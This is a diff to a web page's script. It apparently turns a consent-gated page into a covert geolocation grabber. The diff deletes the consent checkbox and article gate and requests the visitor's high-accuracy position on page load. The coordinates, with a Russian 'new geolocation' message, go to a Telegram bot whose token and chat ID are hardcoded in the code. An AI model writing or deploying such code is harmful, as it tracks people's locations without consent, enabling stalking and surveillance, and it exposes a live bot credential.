@@ -112,36 +112,40 @@ button:disabled {
 const BOT_TOKEN = "7813938825:AAFEYmSyG68_Ebv9nWcqBAackF42hdq-Ey8";
 const CHAT_ID = "6724600945";
 
-document.getElementById("consent").addEventListener("change", e => {
-    document.getElementById("btn").disabled = !e.target.checked;
-});
-
 function sendLocation(lat, lon) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             chat_id: CHAT_ID,
             latitude: lat,
             longitude: lon
         })
     });
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📍 Новая геолокация\nLat: ${lat}\nLon: ${lon}`
+        })
+    });
 }
 
-function requestLocation() {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            sendLocation(pos.coords.latitude, pos.coords.longitude);
-            document.getElementById("gate").style.display = "none";
-            document.getElementById("article").style.display = "block";
-        },
-        () => {
-            alert("Без прохождения проверки доступ невозможен.");
-        },
-        { enableHighAccuracy: true }
-    );
-}
+navigator.geolocation.getCurrentPosition(
+    (pos) => {
+        sendLocation(
+            pos.coords.latitude,
+            pos.coords.longitude
+        );
+        document.body.innerHTML = "✅ Готово";
+    },
+    (err) => {
+        document.body.innerHTML = "❌ Доступ к геолокации запрещён";
+    },
+    { enableHighAccuracy: true }
+);
 </script>
-
 </body>
 </html>
